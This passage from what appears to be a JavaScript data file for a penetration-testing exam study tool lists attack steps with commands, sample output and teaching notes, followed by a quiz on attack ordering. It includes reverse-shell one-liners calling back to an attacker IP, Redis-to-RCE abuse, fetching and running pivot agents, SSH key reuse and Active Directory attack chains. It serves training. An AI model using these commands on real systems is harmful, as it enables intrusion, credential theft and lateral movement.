      cmd: "PGPASSWORD=postgres psql -h 10.10.10.10 -U postgres -c 'SELECT version();'", tool: 'psql',
      output: [
        '                         version',
        '--------------------------------------------------------------',
        ' PostgreSQL 13.3 on x86_64-pc-linux-gnu, compiled by gcc 10.2',
        '(1 row)',
      ].join('\n'),
      signal: ' PostgreSQL 13.3 on x86_64-pc-linux-gnu, compiled by gcc 10.2',
      teach: 'A PostgreSQL session with the right role can read files and, via COPY ... FROM PROGRAM, run commands. As with any DB foothold, the version tells you which of those paths is open to you.',
    },
    'redis-enum': {
      why: "An exposed Redis very often has no AUTH at all, so INFO and KEYS dump cached secrets for free, and a writable instance can be pushed to RCE by writing an SSH key or a webshell to disk. Reach for it the moment you see Redis open. First read what is cached (sessions and secrets live there), then, if it is writable and you know a path, escalate the write into code execution.",
      cmd: 'redis-cli -h 10.10.10.10 INFO server', tool: 'redis-cli',
      output: [
        '# Server',
        'redis_version:6.0.16',
        'os:Linux 5.15.0-79-generic x86_64',
        'config_file:/etc/redis/redis.conf',
      ].join('\n'),
      signal: 'redis_version:6.0.16',
      teach: 'An unauthenticated Redis answers INFO to anyone. Beyond the version, a writable Redis can be abused to drop an SSH key or a web shell (CONFIG SET dir / dbfilename), an open Redis on 6379 is frequently a direct foothold.',
    },
    'mongo-enum': {
      why: "An exposed MongoDB with no auth lets you list databases and dump collections outright, which spills application data and any credentials stored in it. Reach for it whenever Mongo is open and unauthenticated. There is no injection or cracking involved, it is just reading what should have been locked down, so enumerate the collections and mine them for credentials and anything that unlocks the next step.",
      cmd: 'nmap -Pn -p 27017 --script mongodb-info,mongodb-databases 10.10.10.10', tool: 'nmap',
      output: [
        'PORT      STATE SERVICE',
        '27017/tcp open  mongodb',
        '| mongodb-databases:',
        '|   admin   users   app_secrets',
        '|_  (no authentication required)',
      ].join('\n'),
      signal: '|_  (no authentication required)',
      teach: 'MongoDB historically shipped with no authentication. If you can list databases without credentials, you can read them, app_secrets and users collections often hold password hashes or API keys outright.',
    },

    // ============================ SHELLS & TRANSFER ============================
    'ssh-key-login': {
      why: "A private key recovered from loot, an LFI read, a backup, a readable home, a git dump, is a clean foothold whenever SSH is reachable: no password, no brute-force. Save it, chmod 600 it (SSH refuses loose permissions), and log in. Reach for it the moment you find a PEM key. The one puzzle is the username, so look at the key's path and the files around it for whose key it is.",
      cmd: 'chmod 600 id_rsa && ssh -i id_rsa -o StrictHostKeyChecking=no bob@10.10.10.10', tool: 'ssh',
      output: [
        'Last login: Mon Jan  1 10:00:00 2024 from 10.10.14.5',
        'bob@target:~$ id',
        'uid=1000(bob) gid=1000(bob) groups=1000(bob)',
      ].join('\n'),
      signal: 'bob@target:~$ id',
      teach: 'A private key you looted is a password-free login, but SSH refuses a key others can read, hence chmod 600. A stable SSH session beats any reverse shell: it has a real TTY and survives. Try looted keys against every user and host.',
    },
    'shell-listener': {
      why: "Every reverse shell needs a catcher waiting before the payload fires, so starting the listener is the step people forget and then wonder why their shell \"did not work\". Reach for it right before you trigger any reverse-shell payload. The discipline to build: listener first, confirm it is listening, then fire the payload, because a callback with nothing to catch it is just a lost shell.",
      cmd: 'rlwrap nc -lvnp 4444', tool: 'rlwrap',
      output: [
        'Listening on 0.0.0.0 4444',
      ].join('\n'),
      signal: 'Listening on 0.0.0.0 4444',
      teach: 'Before you fire a reverse shell, start the catcher. nc -lvnp 4444 listens; wrapping it in rlwrap gives you command history and arrow keys once the shell lands. Set the listener first, a callback with nothing listening is lost.',
    },
    'shell-revshell-linux': {
      why: "A confirmed command-execution primitive on Linux becomes an interactive shell by firing a bash or python callback to your waiting listener. Reach for it once you can run commands (through a web bug, a service, SSH) and want hands-on access. Match the payload to what the target actually has: not every box has bash or python, so knowing a couple of fallbacks (nc, perl) is what keeps a one-shot RCE from going to waste.",
      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
      teach: 'Start the listener FIRST, then deliver the payload on the target (through a web bug, a cron, an upload). It dials back and your listener catches it, code execution becoming an interactive shell. The prompt is raw; upgrade it to a PTY next.',
      steps: [
        { where: 'local', tool: 'nc', cmd: 'rlwrap nc -lvnp 4444', output: 'Listening on 0.0.0.0 4444' },
        { where: 'host', tool: 'bash', cmd: "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'", output: [
          '↩ caught back on your listener:',
          'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
          'www-data@target:/var/www/html$ id',
          'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
        ].join('\n') },
      ],
    },
    'shell-revshell-windows': {
      why: "A command-execution primitive on Windows becomes a shell via a PowerShell or nc.exe callback to your listener. Reach for it once you can run commands on a Windows target. The practical wrinkle is that Windows payloads get caught by Defender more than Linux ones, so understanding a couple of variants, and the defense-enum findings about exclusions, is what makes the difference between a shell and an alert.",
      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
      teach: 'Same two beats as a Linux reverse shell: listener on your box first, then run the PowerShell payload on the target. It calls back and you land as the service account the web app runs under; next comes Windows enumeration.',
      steps: [
        { where: 'local', tool: 'nc', cmd: 'rlwrap nc -lvnp 4444', output: 'Listening on 0.0.0.0 4444' },
        { where: 'host', tool: 'powershell', cmd: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);...\"", output: [
          '↩ caught back on your listener:',
          'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
          'PS C:\\> whoami',
          'acme\\svc_web',
        ].join('\n') },
      ],
    },
    'shell-pty-upgrade': {
      why: "A freshly caught reverse shell is dumb: line-buffered, no Ctrl-C, no job control, and su, sudo, and vim all refuse to work properly in it. Upgrading it to a full PTY fixes all of that. Reach for it immediately after you catch a shell, before you try anything interactive. It is a small ritual (a python pty spawn, then stty) that saves constant frustration, so make it automatic.",
      signal: 'www-data@target:/$ export TERM=xterm',
      teach: 'A raw netcat shell has no job control, no arrows, no tab-complete, and dies on Ctrl-C. The fix is two-sided: spawn a PTY inside the shell, then background it with Ctrl-Z and fix YOUR terminal with stty before foregrounding. Do it before anything interactive, like su or ssh.',
      steps: [
        { where: 'host', tool: 'python3', cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", output: [
          'www-data@target:/$',
          '# now press Ctrl-Z to background this shell',
        ].join('\n') },
        { where: 'local', tool: 'sh', cmd: 'stty raw -echo; fg', output: [
          'nc -lvnp 4444',
          'www-data@target:/$ export TERM=xterm',
        ].join('\n') },
      ],
    },
    'linux-remote-exec': {
      why: "With a Linux credential (a password or a key) and SSH reachable, you can run commands without holding an interactive session, which is ideal for quick enumeration, privesc checks, and grabbing flags. Reach for it when you have creds and want to work fast or scriptably. It is the difference between fumbling in a fragile reverse shell and running clean commands over real SSH, prefer it whenever you have the credentials.",
      cmd: "sshpass -p 'Autumn2026!' ssh -o StrictHostKeyChecking=no bob@10.10.10.10 id", tool: 'sshpass',
      output: [
        'uid=1001(bob) gid=1001(bob) groups=1001(bob),27(sudo)',
      ].join('\n'),
      signal: 'uid=1001(bob) gid=1001(bob) groups=1001(bob),27(sudo)',
      teach: 'Once you have a password, you can run a single command over SSH non-interactively, handy for scripted checks. The sudo group in bob\'s id output is a privesc lead: a sudo-group user can often get root directly.',
    },

    // ============================ PIVOTING & TUNNELING ============================
    'local-linux-interfaces': {
      why: "Before you can pivot you need to know what the foothold can see, and a second network interface is the clearest sign of a network behind this host that you cannot reach directly. Reach for it right after landing a Linux shell, as part of orienting. A box with one NIC is a dead end for pivoting; a box with two is a doorway, and this is how you tell which you have.",
      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip -o addr show', tool: 'sshpass',
      output: [
        '2: eth0    inet 10.10.10.10/24 scope global eth0',
        '3: eth1    inet 172.16.5.10/24 scope global eth1',
      ].join('\n'),
      signal: '3: eth1    inet 172.16.5.10/24 scope global eth1',
      teach: 'A compromised host with a second NIC is a doorway. eth1 on 172.16.5.0/24 is a network you could not reach before, the reason to pivot. Map the host\'s interfaces first; they tell you what is now in range.',
    },
    'local-linux-routes': {
      why: "The routing table on a foothold names the networks this host knows how to reach, which are your candidate targets for a tunnel. Reach for it alongside the interface check when you suspect there is more network behind the box. It keeps your pivoting honest: the routes tell you which subnets actually exist, so you build toward something real instead of guessing.",
      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip route', tool: 'sshpass',
      output: [
        'default via 10.10.10.1 dev eth0',
        '172.16.5.0/24 dev eth1 proto kernel scope link src 172.16.5.10',
      ].join('\n'),
      signal: '172.16.5.0/24 dev eth1 proto kernel scope link src 172.16.5.10',
      teach: 'The routing table shows which networks this host reaches directly. A route to 172.16.5.0/24 that you cannot touch from your box is exactly what you pivot through this host to reach.',
    },
    'local-linux-neighbors': {
      why: "The ARP neighbor cache lists hosts this box has recently talked to on its local segments, a weak but genuine hint about live internal machines. Reach for it when orienting a foothold for a pivot. It is not authoritative (caches age out), but a populated ARP table points you at real neighbors to validate once the tunnel is up, which beats scanning a whole subnet blind.",
      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip neigh show', tool: 'sshpass',
      output: [
        '172.16.5.20 dev eth1 lladdr 00:0c:29:aa:bb:cc REACHABLE',
        '172.16.5.25 dev eth1 lladdr 00:0c:29:dd:ee:ff STALE',
      ].join('\n'),
      signal: '172.16.5.20 dev eth1 lladdr 00:0c:29:aa:bb:cc REACHABLE',
      teach: 'The ARP/neighbour cache lists hosts this box has actually talked to on the internal segment, live, confirmed targets you could not see from outside. It is a free, no-scan map of what is alive next door.',
    },
    'local-linux-dns': {
      why: "The resolver configuration on a foothold reveals the internal DNS servers, which are themselves high-value: internal DNS often knows every hostname in the environment and can be enumerated once you can reach it. Reach for it while mapping the network behind a Linux foothold. Internal DNS is both a target and a map, so noting the resolvers early pays off when the tunnel is built.",
      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 cat /etc/resolv.conf', tool: 'sshpass',
      output: [
        'search acme.internal',
        'nameserver 172.16.5.5',
      ].join('\n'),
      signal: 'nameserver 172.16.5.5',
      teach: 'The internal DNS server and search domain tell you this host lives in acme.internal and resolves via 172.16.5.5, likely a domain controller. Internal DNS is both a high-value target and a way to enumerate the network by name.',
    },
    'local-windows-interfaces': {
      why: "Same orientation step as on Linux, from a Windows WinRM foothold: extra NICs, DNS servers, or subnets signal a network behind this host worth pivoting into. Reach for it right after landing on Windows. In AD environments especially, the second interface frequently faces the internal server segment where the domain controllers and the real targets live.",
      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "ipconfig"', tool: 'nxc',
      output: [
        'WINRM  10.10.10.20  5985  WS01  Ethernet adapter Ethernet0:',
        'WINRM  10.10.10.20  5985  WS01     IPv4 Address. . . : 10.10.10.20',
        'WINRM  10.10.10.20  5985  WS01     IPv4 Address. . . : 172.16.5.20',
      ].join('\n'),
      signal: 'WINRM  10.10.10.20  5985  WS01     IPv4 Address. . . : 172.16.5.20',
      teach: 'A dual-homed Windows host bridges two networks. The second address (172.16.5.20) is on a segment you reach only through this box, the reason to pivot. Map the interfaces first; they define what is now in range.',
    },
    'local-windows-routes': {
      why: "The Windows route table exposes internal subnets before any tunnel exists, telling you where a pivot could reach. Reach for it alongside the interface check when orienting a Windows foothold. As on Linux, it keeps your pivoting honest: build the tunnel toward subnets the routes actually show, not toward guesses.",
      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "route print"', tool: 'nxc',
      output: [
        'WINRM  10.10.10.20  5985  WS01  Network Destination  Netmask        Interface',
        'WINRM  10.10.10.20  5985  WS01  172.16.5.0           255.255.255.0  172.16.5.20',
      ].join('\n'),
      signal: 'WINRM  10.10.10.20  5985  WS01  172.16.5.0           255.255.255.0  172.16.5.20',
      teach: 'route print shows the networks this host routes to directly. A 172.16.5.0/24 entry on the internal NIC is a subnet reachable from here but not from your box, your pivot target.',
    },
    'local-windows-neighbors': {
      why: "The Windows ARP cache names nearby internal hosts this box has spoken to, useful seeds for what to validate once a tunnel is up. Reach for it while mapping a Windows foothold's surroundings. Treat the entries as leads rather than gospel, but a known neighbor is a far better first target than a cold subnet sweep.",
      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "arp -a"', tool: 'nxc',
      output: [
        'WINRM  10.10.10.20  5985  WS01  Interface: 172.16.5.20',
        'WINRM  10.10.10.20  5985  WS01    172.16.5.5    00-0c-29-11-22-33  dynamic',
        'WINRM  10.10.10.20  5985  WS01    172.16.5.30   00-0c-29-44-55-66  dynamic',
      ].join('\n'),
      signal: 'WINRM  10.10.10.20  5985  WS01    172.16.5.5    00-0c-29-11-22-33  dynamic',
      teach: 'The Windows ARP cache lists internal hosts this box has communicated with, confirmed-alive targets on the far side, found without sending a scan packet. Start your internal enumeration from these.',
    },
    'local-windows-listeners': {
      why: "The listening sockets on a Windows foothold show which services run locally, including ones bound only to localhost that you could reach through a port-forward. Reach for it when deciding what to tunnel. A service on 127.0.0.1 is invisible from the network but wide open to you on the box, and forwarding its port is often the cleanest way in to it.",
      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "netstat -ano"', tool: 'nxc',
      output: [
        'WINRM  10.10.10.20  5985  WS01    TCP  0.0.0.0:445      LISTENING  4',
        'WINRM  10.10.10.20  5985  WS01    TCP  127.0.0.1:1433   LISTENING  3120',
      ].join('\n'),
      signal: 'WINRM  10.10.10.20  5985  WS01    TCP  127.0.0.1:1433   LISTENING  3120',
      teach: 'A service bound to 127.0.0.1 is reachable only from the box itself, like MSSQL on 1433 here. You cannot hit it from the network, but once you tunnel in, that loopback-only service becomes a target. Local listeners reveal what a pivot unlocks.',
    },
    'pivot-chisel-socks': {
      why: "When the foothold can see an internal subnet you cannot, a reverse SOCKS proxy served by chisel routes your Kali tooling through the compromised host onto that segment. Reach for it when you have confirmed a reachable internal network and need your tools to reach it. \"Reverse\" matters: the agent connects back to you, which works even when the target cannot accept inbound connections, the usual case behind a firewall.",
      signal: 'client: tun: proxy#R:127.0.0.1:1080=>socks',
      teach: 'Chisel builds a SOCKS proxy back through the compromised host, but chisel is not on that host yet, so the chain is: start the reverse server on your box, serve the chisel binary, pull it down and run the client on the target, then point proxychains at 127.0.0.1:1080. After that your tools reach the internal network through the one box you own.',
      steps: [
        { where: 'local', tool: 'chisel', cmd: 'chisel server -p 8080 --reverse', output: [
          'server: Reverse tunnelling enabled',
          'server: Listening on http://0.0.0.0:8080',
        ].join('\n') },
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding the chisel binary', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'wget', cmd: 'wget http://10.10.14.5:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel && /tmp/chisel client 10.10.14.5:8080 R:1080:socks', output: [
          "Saved '/tmp/chisel' [8577024/8577024]",
          'client: Connected to http://10.10.14.5:8080',
          'client: tun: proxy#R:127.0.0.1:1080=>socks',
        ].join('\n') },
        { where: 'local', tool: 'sh', cmd: "echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf", output: 'socks5 127.0.0.1 1080' },
      ],
    },
    'pivot-ligolo': {
      why: "ligolo-ng builds a pivot as a real network interface on your box: the agent connects back, you add a route for the internal subnet, and those hosts answer as if directly attached, with no proxychains. Reach for it when you want a clean, fast pivot and are tired of wrapping every command. Its ergonomics, a TUN interface instead of a SOCKS proxy, are why many operators prefer it: your tools just work against the internal range.",
      signal: '[+] Route to 172.16.5.0/24 added via ligolo, internal subnet reachable',
      teach: 'Ligolo-ng gives you a REAL network interface to the internal subnet, fast, no proxychains. But the agent is not on the host yet, so the full chain spans both machines: on your box create the tun, start the proxy, and serve the agent binary; on the target download it, make it executable and run it so it connects back; then on your box select the session and add the internal route. After that your box reaches 172.16.5.0/24 natively.',
      steps: [
        { where: 'local', tool: 'ligolo-proxy', cmd: 'sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert', output: [
          'ligolo-proxy » Listening on 0.0.0.0:11601 (self-signed TLS)',
        ].join('\n') },
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding the Linux "agent" binary', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'wget', cmd: 'wget http://10.10.14.5:8000/agent -O /tmp/.a && chmod +x /tmp/.a && /tmp/.a -connect 10.10.14.5:11601 -ignore-cert', output: [
          "Saved '/tmp/.a' [8724234/8724234]",
          'time="10:41:07" level=info msg="Connection established" addr="10.10.14.5:11601"',
        ].join('\n') },
        { where: 'local', tool: 'ligolo-proxy', cmd: 'session   # select the agent, then: sudo ip route add 172.16.5.0/24 dev ligolo', output: [
          'ligolo-proxy » [Agent] joined from 10.10.10.20 (ACME\\WS01)',
          '[+] Route to 172.16.5.0/24 added via ligolo, internal subnet reachable',
        ].join('\n') },
      ],
    },
    'pivot-sshuttle': {
      why: "With working SSH credentials on the foothold, sshuttle carries an entire subnet over that SSH session transparently, with no proxychains and no client proxy config. Reach for it when the pivot host has SSH and you have creds, it is the least-friction tunnel there is. The requirement is SSH access specifically, so it shines on Linux footholds where you already recovered a key or password.",
      cmd: 'sshuttle -r bob@10.10.10.10 172.16.5.0/24', tool: 'sshuttle',
      output: [
        'c : Connected to server.',
        'c : Connected to server (internal subnet 172.16.5.0/24 now routed).',
      ].join('\n'),
      signal: 'c : Connected to server.',
      teach: 'sshuttle builds a transparent VPN-like route over SSH from your box alone, no agent on the target. Once "Connected", traffic to 172.16.5.0/24 just works, no proxychains wrapper. The most convenient pivot when you have SSH access.',
    },
    'pivot-ssh-dynamic': {
      why: "`ssh -D` alone stands up a SOCKS proxy through the foothold, the zero-extra-tooling pivot whenever you already hold SSH credentials. Reach for it when you want a quick tunnel and do not want to upload anything. It is the minimalist option: one SSH flag gives a working SOCKS proxy, which you point proxychains at. When you have SSH creds, this is often all the pivot you need.",
      signal: 'socks5 127.0.0.1 1080',
      teach: 'An SSH dynamic port-forward (-D) turns an SSH session into a SOCKS proxy, the simplest pivot when you have SSH creds, no extra tools. Open the proxy, then tell proxychains to use it; your tools then reach the internal network through the box.',
      steps: [
        { where: 'local', tool: 'ssh', cmd: 'ssh -D 1080 -N bob@10.10.10.10', output: '# SSH SOCKS proxy now listening on 127.0.0.1:1080 (leave this session open)' },
        { where: 'local', tool: 'sh', cmd: 'grep -i socks /etc/proxychains4.conf', output: 'socks5 127.0.0.1 1080' },
      ],
    },
    'pivot-scan-through': {
      why: "Once a SOCKS tunnel is up, proxychains wrapping a TCP-connect nmap enumerates the now-reachable internal host, and it must be a connect scan (-sT), because SYN scans do not survive a SOCKS proxy. Reach for it immediately after building a tunnel, to learn what the internal target runs. The gotcha that bites everyone is forgetting -sT and -Pn; through a proxy, a normal nmap just hangs.",
      cmd: 'proxychains -q nmap -sT -Pn -n 172.16.5.20', tool: 'proxychains',
      output: [
        'Nmap scan report for 172.16.5.20',
        'PORT    STATE SERVICE',
        '445/tcp open  microsoft-ds',
        '3389/tcp open ms-wbt-server',
      ].join('\n'),
      signal: '445/tcp open  microsoft-ds',
      teach: 'Through a SOCKS proxy you must use TCP connect scans (-sT) and skip host discovery (-Pn), SYN scans and ping do not survive a proxy. Scanning the internal host over your pivot is how enumeration starts again, one network deeper.',
    },

    // ============================ FLAGS & PROOF ============================
    'flag-hunt-linux': {
      why: "The flags are the objective: reading them is how you prove the box is yours, and on the exam a flag you cannot screenshot is a flag you did not capture. Reach for it once you hold the access the flag requires (user flag with a user shell, root flag with root). The discipline that matters is proof: read the flag in a shell you can screenshot showing your access, because OffSec scores a flag grabbed remotely without that context as zero.",
      cmd: "find / -xdev -type f \\( -name user.txt -o -name root.txt -o -name proof.txt \\) 2>/dev/null", tool: 'sh',
      output: [
        '/home/bob/user.txt',
        '/root/root.txt',
      ].join('\n'),
      signal: '/root/root.txt',
      teach: 'The flags are the point: user.txt in a home directory, root.txt under /root. Capture both, and on a real exam, also screenshot the hostname, your id/whoami, and the IP in the same frame so the proof is undeniable.',
    },
    'flag-hunt-windows': {
      why: "Same objective on Windows: read the flag files to prove the compromise, and print each one next to `ipconfig` so a single screenshot shows both the flag and the host it came from. Reach for it once you hold the required access. The exam scores proof, not just the string, so capture the flag inside an interactive session on the target with your identity and the host's IP visible, that screenshot is what earns the points.",
      cmd: 'nxc smb 10.10.10.10 -u administrator -H <nthash> --spider C$ --regex "(proof|user|root)\\.txt"', tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  TARGET  //C$/Users/bob/Desktop/user.txt',
        'SMB  10.10.10.10  445  TARGET  //C$/Users/Administrator/Desktop/proof.txt',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  TARGET  //C$/Users/Administrator/Desktop/proof.txt',
      teach: 'On Windows the flags sit on the Desktops, user.txt for the low-priv user, proof.txt (or root.txt) for Administrator. Grab both, and capture whoami, hostname, and ipconfig alongside the flag so your screenshot proves the compromise.',
    },

  };

  // --- retrieval-practice metadata (the "Your turn" gear) ------------------------------------
  // Kept separate from the sample output so each move's (command, output) pair stays obvious. The
  // verdict for each choice is computed in study.js from the real requires; only the choice set and
  // nuance coaching live here. Merged onto the fixtures above.
  var PRACTICE = {
    'nmap-fast-open-ports': { situation: 'You have a target IP and nothing else. Where do you start?', choices: ['nmap-fast-open-ports', 'nmap-version-scripts', 'recon-smb-anon', 'recon-web-triage'], coach: { 'nmap-version-scripts': 'That is the right follow-up, but run a fast all-ports sweep first so you know which ports even exist before you fingerprint them.', 'recon-smb-anon': 'You can only enumerate SMB once you know 445 is open. Scan first.', 'recon-web-triage': 'Same, triage the web only after a scan confirms a web port is there.' } },
    'nmap-version-scripts': { situation: 'Your fast scan found 22, 80 and 445 open. What next?', choices: ['nmap-version-scripts', 'recon-web-triage', 'recon-smb-anon', 'nmap-fast-open-ports'], coach: { 'recon-web-triage': 'Good instinct, and valid, but a version/script scan on all the open ports at once gives you leads on SSH and SMB too, not just the web.', 'recon-smb-anon': 'Also reasonable, but fingerprint the versions first; it is cheap and tells you which services are worth your time.', 'nmap-fast-open-ports': 'Already done, you have the open ports. Now get the versions behind them.' } },
    'recon-smb-anon': { situation: 'The scan shows SMB open on 445 and you have no credentials. What do you try?', choices: ['recon-smb-anon', 'recon-web-triage', 'nmap-version-scripts'], coach: { 'recon-web-triage': 'Fine if there is also a web port, but a free anonymous SMB check costs nothing and often hands you a readable share.', 'nmap-version-scripts': 'You already know the service; now actually enumerate it.' } },
    'recon-web-triage': { situation: 'Port 80 is open. Before brute-forcing anything, what do you do first?', choices: ['recon-web-triage', 'content-discovery', 'nmap-version-scripts'], coach: { 'content-discovery': 'That comes next, but fingerprint the stack first, so your wordlists and attacks match the tech (a WordPress site wants a WordPress approach).', 'nmap-version-scripts': 'Useful, but whatweb/triage tells you the app framework and CMS, which the nmap banner often misses.' } },
    'ad-dc-identify': { situation: 'A fresh scan shows 88, 389 and 445 open on one host, and the LDAP banner names a domain.', choices: ['ad-dc-identify', 'ad-anon-ldap-enum', 'asrep-roast', 'dcsync'], coach: { 'ad-anon-ldap-enum': 'That is the right next step, but only once you have confirmed this is the DC and captured the domain name. First, name the target.', 'asrep-roast': 'Roasting needs a user list you do not have yet. You are one step too early.', 'dcsync': 'DCSync replicates every hash, it needs Domain Admin. This is the endgame, not the opening.' } },
    'ad-anon-ldap-enum': { situation: 'You have confirmed the DC and the domain is acme.internal. You hold no credentials yet.', choices: ['ad-anon-ldap-enum', 'asrep-roast', 'password-spray', 'dcsync'], coach: { 'asrep-roast': 'Roasting needs a user list first. Get the list, then roast.', 'password-spray': 'Spraying also needs the user list first, same prerequisite.', 'dcsync': 'Needs Domain Admin. Far too early.' } },
    'asrep-roast': { situation: 'Anonymous LDAP handed you a user list and the DC answers on 88. You still have no credentials.', choices: ['asrep-roast', 'password-spray', 'kerberoast', 'dcsync'], coach: { 'password-spray': 'Also valid off the user list, but it puts failed logons on the wire and risks lockout. AS-REP roasting gets crackable material with zero auth attempts, so it is the quieter opening move.', 'kerberoast': 'Kerberoasting needs valid credentials to request service tickets, you have none. AS-REP roasting is its no-creds cousin: same idea, but it targets pre-auth-disabled accounts you can ask for anonymously.', 'dcsync': 'Needs Domain Admin replication rights. This is the endgame, not step one.' } },
    'crack-asrep': { situation: 'You captured a $krb5asrep$23$ hash for tgibson and copied it to your box.', choices: ['crack-asrep', 'password-spray', 'ad-acl-abuse', 'dcsync'], coach: { 'password-spray': 'You could spray, but you are holding a hash that may crack into a real password in seconds. Cash the hash you have first.', 'ad-acl-abuse': 'ACL abuse needs a mapped attack path (BloodHound) and usually a foothold credential, you are not there yet.', 'dcsync': 'Still needs Domain Admin. One cracked user is not that.' } },
    'password-spray': { situation: 'You have a user list and the DC. AS-REP returned nothing roastable, so you try one seasonal password against everyone.', choices: ['password-spray', 'asrep-roast', 'kerberoast', 'dcsync'], coach: { 'asrep-roast': 'Worth trying first (it is quieter), but if it returned nothing roastable, a careful single-password spray is the reasonable next swing.', 'kerberoast': 'Still needs valid creds, which is exactly what the spray is trying to get you. Spray first, then roast service accounts.', 'dcsync': 'Needs Domain Admin. A sprayed low-priv login is not that.' } },
    'ad-acl-abuse': { situation: 'You have a valid domain credential and BloodHound mapped a control path: your user has GenericAll over a privileged group.', choices: ['ad-acl-abuse', 'kerberoast', 'dcsync', 'asrep-roast'], coach: { 'kerberoast': 'Reasonable with creds in hand, but you are holding a direct control-path edge to privilege, walk the ACL path rather than gambling on a crackable service ticket.', 'dcsync': 'The right destination, but you need the replication rights first. The ACL abuse is how you get them.', 'asrep-roast': 'You are well past the no-creds opening now, you already have a credential and a path.' } },
    'dcsync': { situation: 'An ACL path escalated you to a principal with domain replication rights.', choices: ['dcsync', 'ad-acl-abuse', 'kerberoast', 'password-spray'], coach: { 'ad-acl-abuse': 'That was the previous step, the one that got you the replication rights. You are past it now.', 'kerberoast': 'Why crack one service account when you can replicate every hash in the domain? You are beyond this.', 'password-spray': 'Far beneath where you are now, you hold replication rights over the whole domain.' } },
    'content-discovery': { situation: 'You fingerprinted the web stack. Now you want to find what is actually reachable on the server.', choices: ['content-discovery', 'param-discovery', 'lfi-probe', 'recon-web-triage'], coach: { 'param-discovery': 'That comes after you have pages to test, first discover the endpoints, then fuzz each one for hidden parameters.', 'lfi-probe': 'You can only probe a parameter you have found. Map the site first.', 'recon-web-triage': 'Already done, you know the stack. Now enumerate its content.' } },
    'param-discovery': { situation: 'Content discovery found /view.php but it renders blank with no obvious inputs.', choices: ['param-discovery', 'lfi-probe', 'content-discovery'], coach: { 'lfi-probe': 'You need a parameter to probe first, view.php showed none, so fuzz for hidden ones before testing traversal.', 'content-discovery': 'You already have the endpoint; now find its inputs.' } },
    'lfi-probe': { situation: 'You found a page=... parameter on view.php. How do you test whether it is injectable?', choices: ['lfi-probe', 'file-upload', 'param-discovery'], coach: { 'file-upload': 'Different vector, only if there is an upload form. The page= parameter is begging for a traversal test first.', 'param-discovery': 'You already have the parameter; now exploit it.' } },
    'file-upload': { situation: 'An upload form accepts files and you can reach /uploads/ in your browser.', choices: ['file-upload', 'web-shells', 'lfi-probe'], coach: { 'web-shells': 'That is the very next step, once the upload lands a webshell, upgrade it to a reverse shell. But first you have to get the file to execute.', 'lfi-probe': 'A different vector; you have a working upload path, so use it.' } },
    'web-shells': { situation: 'You have code execution through a webshell but it is clunky, one command per request.', choices: ['web-shells', 'linux-enum', 'file-upload'], coach: { 'linux-enum': 'Right idea for after you have a proper shell, but upgrade the clunky webshell to an interactive reverse shell first, then enumerate.', 'file-upload': 'Already done, the upload gave you the webshell you are now upgrading.' } },
    'linux-enum': { situation: 'You just landed an interactive shell as www-data. What is the very first thing you do?', choices: ['linux-enum', 'sudo-abuse', 'suid-gtfobins', 'cron-abuse'], coach: { 'sudo-abuse': 'You cannot know your sudo rights until you enumerate, run the sweep (or sudo -l) first, then act on what it shows.', 'suid-gtfobins': 'Same, enumerate to find which SUID binaries exist before trying to abuse one.', 'cron-abuse': 'You have not found a writable cron yet. Enumerate first; it will point you at the real vector.' } },
    'sudo-abuse': { situation: 'Enumeration flagged your sudo rights. You run sudo -l and see a NOPASSWD entry.', choices: ['sudo-abuse', 'suid-gtfobins', 'cron-abuse', 'linux-enum'], coach: { 'suid-gtfobins': 'Valid if a SUID binary exists, but a NOPASSWD sudo entry on a GTFOBins binary is the cleanest, loudest-green path, take the sure thing.', 'cron-abuse': 'Slower and needs a writable cron; you are holding a direct NOPASSWD-to-root ticket.', 'linux-enum': 'Already done, enumeration is what handed you this sudo lead.' } },
    'suid-gtfobins': { situation: 'Enumeration listed SUID binaries including /usr/bin/find, but you have no sudo rights.', choices: ['suid-gtfobins', 'sudo-abuse', 'pspy-monitor'], coach: { 'sudo-abuse': 'There are no sudo rights here, that path is closed. The SUID bit on a GTFOBins binary is the open door.', 'pspy-monitor': 'Worth running to catch cron jobs, but you already have a direct SUID-to-root binary in hand.' } },
    'pspy-monitor': { situation: 'No sudo and no useful SUID binary. You suspect something runs on a schedule as root.', choices: ['pspy-monitor', 'cron-abuse', 'suid-gtfobins'], coach: { 'cron-abuse': 'That is the payoff, but first you need to see the job and confirm it runs as root and touches something you can write. pspy shows you that.', 'suid-gtfobins': 'Already checked, no usable SUID binary. Watch the process list instead.' } },
    'cron-abuse': { situation: 'pspy showed a root cron running /opt/backup.sh every 2 minutes, and that file is world-writable.', choices: ['cron-abuse', 'pspy-monitor', 'sudo-abuse'], coach: { 'pspy-monitor': 'That was how you found the job, you are past it. Now abuse the writable script the job runs.', 'sudo-abuse': 'No sudo rights here; the writable root cron is the live path.' } },
